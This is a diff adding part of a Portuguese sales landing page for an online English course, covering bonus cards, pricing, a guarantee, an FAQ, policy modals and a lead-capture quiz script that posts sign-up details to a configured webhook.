+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Dica na hora em que você trava</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Refaz o exercício de outras formas até encaixar</span>
+            </li>
+          </ul>
+          <div class="mt-auto pt-4 border-t border-[#242429] w-full text-sm font-bold flex flex-wrap items-center gap-1.5 sm:gap-2">
+            <s class="line-through text-[#ff6b00]">R$ 37,00</s>
+            <span class="text-zinc-500">·</span>
+            <span class="text-[#00d254]">Incluído na sua matrícula</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- BÔNUS #6 - Suporte Humanizado -->
+      <div class="bonus-card-res rounded-2xl bg-[#141417] border border-[#2e2e36] overflow-hidden flex flex-col">
+        <div class="w-full bg-[#0e0e11] border-b border-[#242429] p-4 flex items-center justify-center">
+          <img alt="Bônus #6: Suporte Humanizado" class="w-full max-h-[210px] object-contain mx-auto block select-none" loading="lazy" src="assets/bonus-suporte-humanizado-v2.webp"/>
+        </div>
+        <div class="p-5 sm:p-6 flex flex-col items-start text-left flex-1">
+          <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider text-[#ff8533] bg-[#ff6b00]/10 border border-[#ff6b00]/50">
+            BÔNUS #6
+          </span>
+          <h4 class="mt-3 text-xl sm:text-2xl font-black text-white tracking-tight leading-snug">
+            Suporte <span class="text-[#ff6b00]">Humanizado</span>
+          </h4>
+          <p class="mt-2 text-sm text-zinc-300 leading-relaxed">
+            Acompanhamento com professor de verdade no fórum da lição ou no WhatsApp para tirar dúvidas.
+          </p>
+          <ul class="mt-4 space-y-2.5 w-full text-sm text-zinc-200">
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Fórum dentro de cada lição</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>WhatsApp com professor de verdade</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Resposta em texto ou áudio corrigindo sua fala</span>
+            </li>
+          </ul>
+          <div class="mt-auto pt-4 border-t border-[#242429] w-full text-sm font-bold flex flex-wrap items-center gap-1.5 sm:gap-2">
+            <s class="line-through text-[#ff6b00]">R$ 97,00</s>
+            <span class="text-zinc-500">·</span>
+            <span class="text-[#00d254]">Incluído na sua matrícula</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4 & 5 · TABELA "RECAPITULANDO" + TAXA DE INSCRIÇÃO R$ 9,99 + 2º BOTÃO DE CHECKOUT -->
+  <div id="recapitulando-resultado" class="mt-12 sm:mt-14 max-w-3xl mx-auto">
+    <h3 class="flex flex-col sm:flex-row sm:items-baseline sm:justify-center text-center gap-1">
+      <span class="text-[#ff6b00] font-black text-[26px] sm:text-4xl">Recapitulando…</span>
+      <span class="sm:ml-4 text-white font-semibold text-lg sm:text-2xl">Veja <strong class="text-[#ff6b00]">tudo que você vai receber</strong></span>
+    </h3>
+
+    <div class="mt-6 bg-[#141417] border border-[#2e2e36] rounded-3xl px-5 py-6 sm:px-10 sm:py-8">
+      <!-- Linha 1 -->
+      <div class="flex items-center justify-between gap-4 py-3.5 border-b border-dashed border-[#3a3a44]">
+        <div class="flex items-center gap-2.5 sm:gap-3 min-w-0 text-left">
+          <span class="shrink-0 text-base sm:text-xl">👉</span>
+          <span class="text-zinc-200 text-[15px] sm:text-lg">Curso Modo Nativo: Do Zero à Conversação</span>
+        </div>
+        <span class="line-through text-[#ff6b00] font-extrabold whitespace-nowrap text-[15px] sm:text-lg shrink-0">R$297,00</span>
+      </div>
+      <!-- Linha 2 -->
+      <div class="flex items-center justify-between gap-4 py-3.5 border-b border-dashed border-[#3a3a44]">
+        <div class="flex items-center gap-2.5 sm:gap-3 min-w-0 text-left">
+          <span class="shrink-0 text-base sm:text-xl">👉</span>
+          <span class="text-zinc-200 text-[15px] sm:text-lg">Fluency Planner</span>
+        </div>
+        <span class="line-through text-[#ff6b00] font-extrabold whitespace-nowrap text-[15px] sm:text-lg shrink-0">R$47,00</span>
+      </div>
+      <!-- Linha 3 -->
+      <div class="flex items-center justify-between gap-4 py-3.5 border-b border-dashed border-[#3a3a44]">
+        <div class="flex items-center gap-2.5 sm:gap-3 min-w-0 text-left">
+          <span class="shrink-0 text-base sm:text-xl">👉</span>
+          <span class="text-zinc-200 text-[15px] sm:text-lg">Tutor Nativo</span>
+        </div>
+        <span class="line-through text-[#ff6b00] font-extrabold whitespace-nowrap text-[15px] sm:text-lg shrink-0">R$97,00</span>
+      </div>
+      <!-- Linha 4 -->
+      <div class="flex items-center justify-between gap-4 py-3.5 border-b border-dashed border-[#3a3a44]">
+        <div class="flex items-center gap-2.5 sm:gap-3 min-w-0 text-left">
+          <span class="shrink-0 text-base sm:text-xl">👉</span>
+          <span class="text-zinc-200 text-[15px] sm:text-lg">Painel de Prompts</span>
+        </div>
+        <span class="line-through text-[#ff6b00] font-extrabold whitespace-nowrap text-[15px] sm:text-lg shrink-0">R$47,00</span>
+      </div>
+      <!-- Linha 5 -->
+      <div class="flex items-center justify-between gap-4 py-3.5 border-b border-dashed border-[#3a3a44]">
+        <div class="flex items-center gap-2.5 sm:gap-3 min-w-0 text-left">
+          <span class="shrink-0 text-base sm:text-xl">👉</span>
+          <span class="text-zinc-200 text-[15px] sm:text-lg">CV Bilíngue</span>
+        </div>
+        <span class="line-through text-[#ff6b00] font-extrabold whitespace-nowrap text-[15px] sm:text-lg shrink-0">R$47,00</span>
+      </div>
+      <!-- Linha 6 -->
+      <div class="flex items-center justify-between gap-4 py-3.5 border-b border-dashed border-[#3a3a44]">
+        <div class="flex items-center gap-2.5 sm:gap-3 min-w-0 text-left">
+          <span class="shrink-0 text-base sm:text-xl">👉</span>
+          <span class="text-zinc-200 text-[15px] sm:text-lg">Modo Guiado</span>
+        </div>
+        <span class="line-through text-[#ff6b00] font-extrabold whitespace-nowrap text-[15px] sm:text-lg shrink-0">R$37,00</span>
+      </div>
+      <!-- Linha 7 -->
+      <div class="flex items-center justify-between gap-4 py-3.5">
+        <div class="flex items-center gap-2.5 sm:gap-3 min-w-0 text-left">
+          <span class="shrink-0 text-base sm:text-xl">👉</span>
+          <span class="text-zinc-200 text-[15px] sm:text-lg">Suporte Humanizado</span>
+        </div>
+        <span class="line-through text-[#ff6b00] font-extrabold whitespace-nowrap text-[15px] sm:text-lg shrink-0">R$97,00</span>
+      </div>
+
+      <p class="mt-6 text-center text-white font-black text-2xl sm:text-3xl">
+        Tudo isso deveria custar <span class="line-through text-[#ff3b30]">R$669</span>
+      </p>
+
+      <!-- Taxa de inscrição simbólica R$ 9,99 -->
+      <div class="mt-6 pt-6 border-t border-[#242429] text-center flex flex-col items-center">
+        <p class="text-zinc-300 text-base sm:text-lg">
+          Mas, para os 100 alunos desta turma, o curso e todos os bônus são por nossa conta:
+        </p>
+        <p class="text-zinc-400 text-xs sm:text-sm mt-5">
+          Curso de <span class="line-through">R$ 297,00</span> por R$ 0,00 · apenas a taxa de inscrição simbólica de
+        </p>
+        <div class="flex items-baseline justify-center gap-1 my-1 whitespace-nowrap">
+          <span class="text-3xl sm:text-4xl font-black text-white">R$</span>
+          <span class="text-[88px] sm:text-[110px] leading-none font-black text-white tracking-tight">9</span>
+          <span class="text-4xl sm:text-5xl font-black text-white">,99</span>
+        </div>
+        <p class="text-zinc-200 text-lg sm:text-xl mt-2 font-medium">
+          Pagamento único. Sem mensalidades.
+        </p>
+
+        <a id="btn-checkout-premium-2" class="cta-checkout-premium w-full sm:w-auto px-6 sm:px-10 py-4 min-h-[56px] mt-6 inline-flex items-center justify-center text-[15px] sm:text-lg font-black text-[#080809] bg-[#00d254] hover:bg-[#00b849] rounded-full shadow-[0_0_30px_rgba(0,210,84,0.4)] hover:shadow-[0_0_40px_rgba(0,210,84,0.6)] transform hover:-translate-y-0.5 transition-all text-center tracking-tight uppercase" href="#">
+          <span>GARANTIR MINHA VAGA POR R$ 9,99</span>
+        </a>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+<!-- ===== SEÇÃO R5 · GARANTIA DE 7 DIAS (#garantia) ===== -->
+<section class="py-14 sm:py-20 bg-[var(--bg-section-alt)] overflow-hidden" id="garantia">
+<div class="mx-auto w-full max-w-6xl px-4 sm:px-6">
+<div class="max-w-4xl mx-auto p-6 sm:p-10 rounded-3xl bg-[#141417] border border-[#27272a] text-white shadow-2xl grid grid-cols-1 md:grid-cols-12 gap-6 items-center">
+<div class="md:col-span-4 flex flex-col items-center justify-center text-center">
+<div class="w-28 h-28 sm:w-32 sm:h-32 rounded-full bg-[#00d254]/10 border-2 border-[#00d254] text-[#00d254] flex flex-col items-center justify-center shadow-[0_0_20px_rgba(0,210,84,0.2)]">
+<span class="material-symbols-outlined text-5xl">verified_user</span>
+<span class="text-xs font-black tracking-widest uppercase mt-0.5">7 DIAS</span>
+</div>
+</div>
+<div class="md:col-span-8 text-center md:text-left">
+<h2 class="text-[24px] sm:text-3xl font-black text-white mt-1">
+              7 dias para testar. O risco é todo nosso.
+            </h2>
+<p class="mt-3 text-zinc-300 text-[15px] sm:text-base leading-relaxed">
+              Entre, faça o nivelamento e as primeiras lições, grave sua voz. Se não sentir que esse é o caminho, peça o reembolso em até 7 dias e devolvemos <strong class="text-white">100%</strong>, sem perguntas.
+            </p>
+</div>
+</div>
+</div>
+</section>
+
+<!-- ===== SEÇÃO R6 · FAQ (#faq) ===== -->
+<section class="py-14 sm:py-20 bg-[var(--bg-section-primary)] overflow-hidden" id="faq">
+<div class="mx-auto max-w-5xl px-4 sm:px-6">
+<h2 class="text-[#ff6b00] font-black text-[28px] sm:text-5xl text-center mb-10">
+      Perguntas Frequentes
+    </h2>
+<div class="space-y-4">
+<div class="faq-item bg-[#141417] border border-[#2e2e36] rounded-2xl overflow-hidden">
+<button type="button" class="faq-btn w-full flex items-center gap-3 text-left px-5 sm:px-7 py-5 sm:py-6 cursor-pointer select-none">
+<span class="faq-icon text-[#ff6b00] text-2xl font-black shrink-0 leading-none select-none">+</span>
+<span class="text-white font-bold text-base sm:text-xl">O que é o Curso Do Zero à Conversação?</span>
+</button>
+<div class="faq-content hidden text-zinc-300 text-[15px] sm:text-base leading-relaxed px-5 sm:px-7 pb-6 pl-12 sm:pl-14">
+<p>É um curso online de inglês, do nível A1 ao C2, feito para quem entende alguma coisa mas trava na hora de falar. São 161 lições de cerca de 15 minutos, em que você ouve, repete em voz alta e recebe a correção da sua fala na hora.</p>
+</div>
+</div>
+<div class="faq-item bg-[#141417] border border-[#2e2e36] rounded-2xl overflow-hidden">
+<button type="button" class="faq-btn w-full flex items-center gap-3 text-left px-5 sm:px-7 py-5 sm:py-6 cursor-pointer select-none">
+<span class="faq-icon text-[#ff6b00] text-2xl font-black shrink-0 leading-none select-none">+</span>
+<span class="text-white font-bold text-base sm:text-xl">Quanto tempo leva para ter resultado?</span>
+</button>
+<div class="faq-content hidden text-zinc-300 text-[15px] sm:text-base leading-relaxed px-5 sm:px-7 pb-6 pl-12 sm:pl-14">
+<p>Já nas primeiras lições você percebe a diferença na hora de falar. O ritmo é seu: com 15 minutos por dia você avança nível a nível, e cada módulo termina com uma avaliação para você ver a sua evolução.</p>
+</div>
+</div>
+<div class="faq-item bg-[#141417] border border-[#2e2e36] rounded-2xl overflow-hidden">
+<button type="button" class="faq-btn w-full flex items-center gap-3 text-left px-5 sm:px-7 py-5 sm:py-6 cursor-pointer select-none">
+<span class="faq-icon text-[#ff6b00] text-2xl font-black shrink-0 leading-none select-none">+</span>
+<span class="text-white font-bold text-base sm:text-xl">Já tentei aprender inglês e não deu certo… por que dessa vez seria diferente?</span>
+</button>
+<div class="faq-content hidden text-zinc-300 text-[15px] sm:text-base leading-relaxed px-5 sm:px-7 pb-6 pl-12 sm:pl-14">
+<p>Porque aqui você não fica só assistindo aula. Em toda lição você fala em voz alta e recebe correção na hora, e o que você erra volta para revisão no dia certo. É treino de fala de verdade, em pequenas doses, que cabe na sua rotina.</p>
+</div>
+</div>
+<div class="faq-item bg-[#141417] border border-[#2e2e36] rounded-2xl overflow-hidden">
+<button type="button" class="faq-btn w-full flex items-center gap-3 text-left px-5 sm:px-7 py-5 sm:py-6 cursor-pointer select-none">
+<span class="faq-icon text-[#ff6b00] text-2xl font-black shrink-0 leading-none select-none">+</span>
+<span class="text-white font-bold text-base sm:text-xl">Qual é a forma de pagamento?</span>
+</button>
+<div class="faq-content hidden text-zinc-300 text-[15px] sm:text-base leading-relaxed px-5 sm:px-7 pb-6 pl-12 sm:pl-14">
+<p>Você paga apenas a taxa de inscrição simbólica de R$ 9,99, uma única vez, no Pix ou no cartão. O curso não tem mensalidades nem parcelas.</p>
+</div>
+</div>
+<div class="faq-item bg-[#141417] border border-[#2e2e36] rounded-2xl overflow-hidden">
+<button type="button" class="faq-btn w-full flex items-center gap-3 text-left px-5 sm:px-7 py-5 sm:py-6 cursor-pointer select-none">
+<span class="faq-icon text-[#ff6b00] text-2xl font-black shrink-0 leading-none select-none">+</span>
+<span class="text-white font-bold text-base sm:text-xl">Se o curso é por conta de vocês, por que existe uma taxa de inscrição?</span>
+</button>
+<div class="faq-content hidden text-zinc-300 text-[15px] sm:text-base leading-relaxed px-5 sm:px-7 pb-6 pl-12 sm:pl-14">
+<p>O valor do curso é por nossa conta. A taxa de inscrição simbólica de R$ 9,99, paga uma única vez, ajuda a manter a equipe acadêmica, a emissão dos certificados de curso livre e esta oportunidade aberta para mais pessoas. Não existem mensalidades.</p>
+</div>
+</div>
+<div class="faq-item bg-[#141417] border border-[#2e2e36] rounded-2xl overflow-hidden">
+<button type="button" class="faq-btn w-full flex items-center gap-3 text-left px-5 sm:px-7 py-5 sm:py-6 cursor-pointer select-none">
+<span class="faq-icon text-[#ff6b00] text-2xl font-black shrink-0 leading-none select-none">+</span>
+<span class="text-white font-bold text-base sm:text-xl">O pagamento é seguro?</span>
+</button>
+<div class="faq-content hidden text-zinc-300 text-[15px] sm:text-base leading-relaxed px-5 sm:px-7 pb-6 pl-12 sm:pl-14">
+<p>Sim. O pagamento é processado pela Hotmart, uma das maiores plataformas de produtos digitais do Brasil, com ambiente 100% seguro.</p>
+</div>
+</div>
+<div class="faq-item bg-[#141417] border border-[#2e2e36] rounded-2xl overflow-hidden">
+<button type="button" class="faq-btn w-full flex items-center gap-3 text-left px-5 sm:px-7 py-5 sm:py-6 cursor-pointer select-none">
+<span class="faq-icon text-[#ff6b00] text-2xl font-black shrink-0 leading-none select-none">+</span>
+<span class="text-white font-bold text-base sm:text-xl">Como recebo o acesso ao curso?</span>
+</button>
+<div class="faq-content hidden text-zinc-300 text-[15px] sm:text-base leading-relaxed px-5 sm:px-7 pb-6 pl-12 sm:pl-14">
+<p>Assim que o pagamento for confirmado, você recebe no seu e-mail o acesso à plataforma, com o curso e todos os bônus liberados. Nesta turma de 100 vagas, você recebe 18 meses de acesso (12 meses + 6 meses de bônus).</p>
+</div>
+</div>
+<div class="faq-item bg-[#141417] border border-[#2e2e36] rounded-2xl overflow-hidden">
+<button type="button" class="faq-btn w-full flex items-center gap-3 text-left px-5 sm:px-7 py-5 sm:py-6 cursor-pointer select-none">
+<span class="faq-icon text-[#ff6b00] text-2xl font-black shrink-0 leading-none select-none">+</span>
+<span class="text-white font-bold text-base sm:text-xl">E se eu não gostar?</span>
+</button>
+<div class="faq-content hidden text-zinc-300 text-[15px] sm:text-base leading-relaxed px-5 sm:px-7 pb-6 pl-12 sm:pl-14">
+<p>Você tem 7 dias de garantia. Se não gostar, é só pedir o reembolso dentro desse prazo e devolvemos 100% dos R$ 9,99 da taxa de inscrição, sem perguntas.</p>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- RODAPÉ DO RESULTADO -->
+<footer class="bg-[#050507] border-t border-[#1f1f24] py-8">
+  <div class="mx-auto max-w-6xl px-4 sm:px-6 flex flex-col sm:flex-row items-center justify-between gap-4 text-center sm:text-left">
+    <div>
+      <p class="text-zinc-300 font-bold text-xs sm:text-sm">MODO NATIVO EDUCAÇÃO DIGITAL LTDA</p>
+      <p class="text-zinc-500 text-xs mt-0.5">CNPJ: 54.829.310/0001-42 · Todos os direitos reservados © 2026</p>
+    </div>
+    <div class="flex items-center gap-4 text-xs font-semibold text-zinc-400">
+      <a href="#politica-privacidade" onclick="abrirModalPrivacidade(event)" class="hover:text-white transition-colors">Política de Privacidade</a>
+      <span>•</span>
+      <a href="#termos-de-uso" onclick="abrirModalTermos(event)" class="hover:text-white transition-colors">Termos de Uso</a>
+    </div>
+  </div>
+</footer>
+
+</main>
+</div>
+
+<!-- MODAL DE POLÍTICA DE PRIVACIDADE -->
+<div id="modal-privacidade" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/80 backdrop-blur-sm p-4">
+  <div class="w-full max-w-lg rounded-3xl bg-[#141417] border border-[#2e2e36] p-6 sm:p-8 text-left shadow-2xl max-h-[85vh] flex flex-col">
+    <div class="flex items-center justify-between gap-4 pb-4 border-b border-[#242429]">
+      <h3 class="text-lg sm:text-xl font-black text-white">Política de Privacidade</h3>
+      <button type="button" onclick="fecharModalPrivacidade()" aria-label="Fechar" class="w-9 h-9 rounded-xl bg-[#1a1a1f] text-zinc-400 hover:text-white flex items-center justify-center cursor-pointer">
+        <span class="material-symbols-outlined text-xl">close</span>
+      </button>
+    </div>
+    <div class="mt-4 space-y-3 text-xs sm:text-sm text-zinc-300 leading-relaxed overflow-y-auto pr-1">
+      <p><strong class="text-white">1. Coleta de Dados:</strong> Coletamos apenas seu nome, e-mail, WhatsApp e as respostas do questionário de perfil para criar sua conta na plataforma Modo Nativo e personalizar sua recomendação de estudos.</p>
+      <p><strong class="text-white">2. Uso das Informações:</strong> Seus dados são utilizados exclusivamente pela MODO NATIVO EDUCAÇÃO DIGITAL para envio do link de criação de senha, suporte pedagógico e comunicações sobre o curso Do Zero à Conversação.</p>
+      <p><strong class="text-white">3. Compartilhamento:</strong> Não vendemos nem compartilhamos seus dados pessoais com terceiros para fins publicitários.</p>
+      <p><strong class="text-white">4. Seus Direitos (LGPD):</strong> Você pode solicitar a atualização ou exclusão dos seus dados a qualquer momento entrando em contato com nosso suporte.</p>
+    </div>
+    <div class="mt-6 pt-4 border-t border-[#242429] text-right">
+      <button type="button" onclick="fecharModalPrivacidade()" class="px-6 py-2.5 rounded-full bg-[#ff6b00] hover:bg-[#ff8533] text-[#080809] font-black text-xs sm:text-sm uppercase cursor-pointer">
+        Entendi
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL DE TERMOS DE USO -->
+<div id="modal-termos" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/80 backdrop-blur-sm p-4">
+  <div class="w-full max-w-lg rounded-3xl bg-[#141417] border border-[#2e2e36] p-6 sm:p-8 text-left shadow-2xl max-h-[85vh] flex flex-col">
+    <div class="flex items-center justify-between gap-4 pb-4 border-b border-[#242429]">
+      <h3 class="text-lg sm:text-xl font-black text-white">Termos de Uso</h3>
+      <button type="button" onclick="fecharModalTermos()" aria-label="Fechar" class="w-9 h-9 rounded-xl bg-[#1a1a1f] text-zinc-400 hover:text-white flex items-center justify-center cursor-pointer">
+        <span class="material-symbols-outlined text-xl">close</span>
+      </button>
+    </div>
+    <div class="mt-4 space-y-3 text-xs sm:text-sm text-zinc-300 leading-relaxed overflow-y-auto pr-1">
+      <p><strong class="text-white">1. Matrícula:</strong> A inscrição na turma de 100 vagas concede acesso ao curso e aos bônus, sem mensalidades, mediante o pagamento único da taxa de inscrição simbólica de R$ 9,99. Em caso de desistência em até 7 dias, o valor é devolvido integralmente.</p>
+      <p><strong class="text-white">2. Uso Pessoal:</strong> A conta criada é pessoal e intransferível, destinada ao treino individual de conversação em inglês.</p>
+      <p><strong class="text-white">3. Propriedade Intelectual:</strong> Todo o material didático, áudios e exercícios da plataforma pertencem à MODO NATIVO EDUCAÇÃO DIGITAL.</p>
+    </div>
+    <div class="mt-6 pt-4 border-t border-[#242429] text-right">
+      <button type="button" onclick="fecharModalTermos()" class="px-6 py-2.5 rounded-full bg-[#ff6b00] hover:bg-[#ff8533] text-[#080809] font-black text-xs sm:text-sm uppercase cursor-pointer">
+        Entendi
+      </button>
+    </div>
+  </div>
+</div>
+
+</div>
+
+<!-- Script Principal: Captura + Quiz de 12 Perguntas + Resultado + Integrações -->
+<script>
+  (function () {
+    // Gera ou recupera o identificador único da sessão logo ao abrir a página
+    var idSessao = "";
+    try {
+      idSessao = sessionStorage.getItem("mn_avaliacao_id_sessao") || "";
+      if (!idSessao) {
+        idSessao = (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function")
+          ? crypto.randomUUID()
+          : "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
+              var r = (Math.random() * 16) | 0;
+              var v = c === "x" ? r : (r & 0x3) | 0x8;
+              return v.toString(16);
+            });
+        sessionStorage.setItem("mn_avaliacao_id_sessao", idSessao);
+      }
+    } catch (e) {
+      idSessao = (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function")
+        ? crypto.randomUUID()
+        : String(Date.now()) + "-" + Math.random().toString(16).slice(2);
+    }
+
+    function formatarTelefoneCom55(digitos) {
+      var d = String(digitos || "").replace(/\D/g, "");
+      if (!d) return "";
+      if (d.indexOf("55") === 0 && d.length >= 12) return d;
+      return "55" + d;
+    }
+
+    function dispararEventoWebhook(chaveSessao, payload) {
+      try {
+        if (typeof WEBHOOK_QUIZ !== "string" || !WEBHOOK_QUIZ.trim()) {
+          return;
+        }
+        try {
+          if (sessionStorage.getItem(chaveSessao) === "1") {
+            return;
+          }
+          sessionStorage.setItem(chaveSessao, "1");
+        } catch (sErr) {}
+
+        var url = WEBHOOK_QUIZ.trim();
+        var bodyStr = JSON.stringify(payload);
+        var concluido = false;
+        var beaconEnviado = false;
+
+        var onUnload = function () {
+          if (!concluido && !beaconEnviado && typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function") {
+            beaconEnviado = true;
+            try {
+              var blob = new Blob([bodyStr], { type: "text/plain;charset=UTF-8" });
+              navigator.sendBeacon(url, blob);
+            } catch (bErr) {}
+          }
+        };
+
+        window.addEventListener("pagehide", onUnload);
+        window.addEventListener("beforeunload", onUnload);
+
+        var limparListeners = function () {
+          concluido = true;
+          window.removeEventListener("pagehide", onUnload);
+          window.removeEventListener("beforeunload", onUnload);
+        };
+
+        var tentarEnvio = function (ehRetry) {
+          fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: bodyStr,
+            keepalive: true
+          }).then(function () {
+            limparListeners();
+          }).catch(function () {
+            // Caminho para quando o webhook não responde com cabeçalhos de CORS (resposta opaca)
+            fetch(url, {
+              method: "POST",
+              mode: "no-cors",
+              headers: { "Content-Type": "text/plain;charset=UTF-8" },
+              body: bodyStr,
+              keepalive: true
+            }).then(function () {
+              limparListeners();
+            }).catch(function (errNoCors) {
+              if (!ehRetry) {
+                setTimeout(function () {
+                  tentarEnvio(true);
+                }, 3000);
+              } else {
+                console.error("Erro ao enviar webhook (" + payload.evento + "):", errNoCors);
+                if (typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function" && !beaconEnviado) {
+                  beaconEnviado = true;
+                  try {
+                    navigator.sendBeacon(url, new Blob([bodyStr], { type: "text/plain;charset=UTF-8" }));
+                  } catch (bErr) {}
+                }
+                limparListeners();
+              }
+            });
+          });
+        };
+
+        tentarEnvio(false);
+      } catch (outerErr) {
+        console.error("Erro inesperado no envio do webhook:", outerErr);
+      }
+    }
+
+    function enviarWebhookLead() {
+      dispararEventoWebhook("mn_avaliacao_webhook_lead_sent", {
+        evento: "lead",
+        id_sessao: idSessao,
+        nome: leadDados.nome,
+        email: leadDados.email,
+        phone: formatarTelefoneCom55(leadDados.telefoneDigitos),
+        origem: "avaliacao",
+        enviado_em: new Date().toISOString()
+      });
+    }
+
+    // Estado Global do Lead e do Quiz
+    var estadoAtual = 1; // 1 = Captura, 2 = Quiz, 3 = Resultado
+    var leadDados = {
+      nome: "",
+      email: "",
+      telefoneDigitos: "",
+      telefoneFormatado: "",
+      jaTemConta: false
+    };
+
+    try {
+      var leadSalvo = sessionStorage.getItem("mn_lead");
+      if (leadSalvo) {
+        var leadObj = JSON.parse(leadSalvo);
+        if (leadObj && typeof leadObj === "object") {
+          if (!leadDados.nome && leadObj.nome) leadDados.nome = leadObj.nome;
+          if (!leadDados.email && leadObj.email) leadDados.email = leadObj.email;
+          if (!leadDados.telefoneDigitos && leadObj.telefoneDigitos) leadDados.telefoneDigitos = leadObj.telefoneDigitos;
+        }
+      }
+    } catch (e) {}
+
+    // Respostas do Quiz usando exatamente os name= do Fluent Forms
+    var respostasQuiz = {
+      input_radio: "",
+      input_text: "",
+      input_radio_1: "",
+      input_radio_2: "",
+      input_radio_3: "",
+      input_radio_5: "",
+      input_text_6: "",
+      input_radio_4: "",
+      input_text_1: "",
+      input_text_4: ""
+    };
+
+    // Definição das 10 perguntas na ordem exata solicitada
+    var PERGUNTAS = [
+      {
+        num: 1,
+        name: "input_radio",
+        titulo: "Para começar, você é:",
+        tipo: "cards",
+        opcoes: [
+          { label: "Masculino", value: "Masculino", emoji: "👨" },
+          { label: "Feminino", value: "Feminino", emoji: "👩" },
+          { label: "Outro", value: "Outro", emoji: "🧑" }
+        ]
+      },
+      {
+        num: 2,
+        name: "input_text",
+        titulo: "Qual a sua idade?",
+        tipo: "cards",
+        opcoes: [
+          { label: "Até 24", value: "Até 24" },
+          { label: "25 a 34", value: "25 a 34" },
+          { label: "35 a 44", value: "35 a 44" },
+          { label: "45+", value: "45+" }
+        ]
+      },
+      {
+        num: 3,
+        name: "input_radio_1",
+        titulo: "Qual o seu estado civil?",
+        tipo: "cards",
+        opcoes: [
+          { label: "Solteiro", value: "Solteiro" },
+          { label: "Casado", value: "Casado" },
+          { label: "Divorciado", value: "Divorciado" },
+          { label: "Viúvo", value: "Viúvo" }
+        ]
+      },
+      {
+        num: 4,
+        name: "input_radio_2",
+        titulo: "Até onde você estudou?",
+        tipo: "cards",
+        opcoes: [
+          { label: "Ensino Fundamental", value: "Ensino Fundamental" },
+          { label: "Ensino Médio", value: "Ensino Médio" },
+          { label: "Ensino Superior", value: "Ensino Superior" },
+          { label: "Pós-graduação", value: "Pós-graduação" },
+          { label: "Mestrado", value: "Mestrado" }
+        ]
+      },
+      {
+        num: 5,
+        name: "input_radio_3",
+        titulo: "Você trabalha atualmente?",
+        tipo: "cards",
+        opcoes: [
+          { label: "Sim", value: "Sim" },
+          { label: "Não", value: "Não" }
+        ]
+      },
+      {
+        num: 6,
+        name: "input_radio_5",
+        titulo: "Em qual área você atua?",
+        tipo: "cards",
+        condicao: function () {
+          return respostasQuiz.input_radio_3 === "Sim";
+        },
+        opcoes: [
+          { label: "Administração ou gestão", value: "Administração ou gestão" },
+          { label: "TI", value: "TI" },
+          { label: "Saúde", value: "Saúde" },
+          { label: "Engenharia", value: "Engenharia" },
+          { label: "Pedagogia", value: "Pedagogia" },
+          { label: "Turismo", value: "Turismo" },
+          { label: "Outro", value: "Outro" }
+        ]
+      },
+      {
+        num: 7,
+        name: "input_text_6",
+        titulo: "Qual é a sua profissão?",
+        tipo: "aberta",
+        placeholder: "Digite sua profissão...",
+        condicao: function () {
+          return respostasQuiz.input_radio_3 === "Sim" && respostasQuiz.input_radio_5 === "Outro";
+        }
+      },
+      {
+        num: 8,
+        name: "input_radio_4",
+        titulo: "Qual a sua renda mensal hoje?",
+        tipo: "cards",
+        opcoes: [
+          { label: "Até R$ 1.500", value: "Até R$ 1.500" },
+          { label: "R$ 1.501 a R$ 2.500", value: "R$ 1.501 a R$ 2.500" },
+          { label: "R$ 2.501 a R$ 3.500", value: "R$ 2.501 a R$ 3.500" },
+          { label: "R$ 3.501 a R$ 5.000", value: "R$ 3.501 a R$ 5.000" },
+          { label: "R$ 5.001 a R$ 10.000", value: "R$ 5.001 a R$ 10.000" },
